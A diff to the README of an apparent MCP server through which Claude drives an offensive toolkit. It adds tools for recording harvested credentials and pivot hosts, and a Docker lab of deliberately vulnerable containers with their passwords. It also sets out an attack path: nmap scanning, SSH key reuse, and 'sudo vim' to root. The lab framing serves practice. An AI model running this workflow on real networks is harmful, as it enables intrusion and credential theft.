@@ -81,6 +81,8 @@ Add to `~/.claude.json`:
 
 ## Available Tools
 
+### Core Tools
+
 | Tool | Description |
 |------|-------------|
 | `connect_to_client` | Connect to proxy (host, port optional) |
@@ -92,7 +94,92 @@ Add to `~/.claude.json`:
 | `list_clients` | List all connected iclients |
 | `set_client` | Set default target client |
 
+### Lateral Movement Tools
+
+| Tool | Description |
+|------|-------------|
+| `add_discovered_host` | Record discovered host (IP, ports, services, OS) |
+| `get_discovered_hosts` | List all discovered hosts |
+| `add_credential` | Store harvested credential (user, secret, type, source) |
+| `get_credentials` | List all harvested credentials |
+| `validate_credential` | Mark credential as working on a host |
+| `mark_host_accessed` | Mark host as accessed (user/root level) |
+| `set_pivot_host` | Set current pivot point (host, method, port) |
+| `get_pivot_status` | Get current pivot configuration |
+| `get_lateral_summary` | Summary of lateral movement progress |
+| `get_movement_log` | Log of all lateral movement actions |
+
+### Resources
+
+| URI | Description |
+|-----|-------------|
+| `privesc://prompt` | Privilege escalation methodology |
+| `privesc://session/status` | Current session status |
+| `lateral://prompt` | Lateral movement methodology (includes Nuclei scanning) |
+| `lateral://state` | Current lateral movement state |
+
 ## Docker Setup
+
+### Lateral Movement Lab (Multi-Host)
+
+A full lab environment with 3 vulnerable hosts on a shared network for practicing lateral movement:
+
+```bash
+# Build and start all containers
+docker-compose up -d --build
+
+# Verify containers are running
+docker-compose ps
+```
+
+#### Network Layout
+
+| Host | IP | Vulnerability | Credentials |
+|------|-----|---------------|-------------|
+| target1_suid | 10.10.10.10 | SUID binary PATH injection | `ctfuser:password` |
+| target2_sshkey | 10.10.10.20 | SSH key exposed in `/opt/.backup_key` | `devuser:devpass123` |
+| target3_sudocron | 10.10.10.30 | `sudo vim` GTFOBins, writable cron | `admin:Sup3rS3cr3t!` |
+
+#### Attack Path
+
+```
+target1 (SUID privesc)
+    → discover network (nmap 10.10.10.0/24)
+    → find target2 (port 22 open)
+
+target2 (SSH key reuse)
+    → find /opt/.backup_key or creds in bash_history
+    → SSH to target3 as admin
+
+target3 (sudo/cron privesc)
+    → sudo vim → :!bash → root
+    → OR modify /opt/scripts/backup.sh → cron runs as root
+```
+
+#### Running the Lab
+
+```bash
+# Terminal 1: Start proxy on host machine
+python3 proxy_relay.py
+
+# Terminal 2: Run iclient on initial target
+docker exec -it target1_suid python3 /home/ctfuser/iclient.py host.docker.internal 65432
+```
+
+After lateral movement to another host, deploy iclient there:
+```bash
+# From target1, SSH to target2 and run iclient
+ssh devuser@10.10.10.20
+python3 /home/devuser/iclient.py host.docker.internal 65432
+```
+
+#### Teardown
+
+```bash
+docker-compose down
+```
+
+### Single Container (Legacy)
 
 ```bash
 # Terminal 1: Start proxy
@@ -124,7 +211,8 @@ python3 iclient.py 127.0.0.1 8000
 | No clients connected | Ensure iclient connected to proxy (port 65432) |
 | MCP server not found | Check absolute path, restart Claude |
 | Module 'mcp' not found | `pip install mcp` |
-| Container can't connect | Use `172.17.0.1` (Docker gateway) not `127.0.0.1` |
+| Container can't connect | Use `host.docker.internal` (docker-compose) or `172.17.0.1` (standalone) |
+| SSH between containers fails | Check target container is running SSH: `docker exec target2_sshkey service ssh status` |
 
 ## Security
 
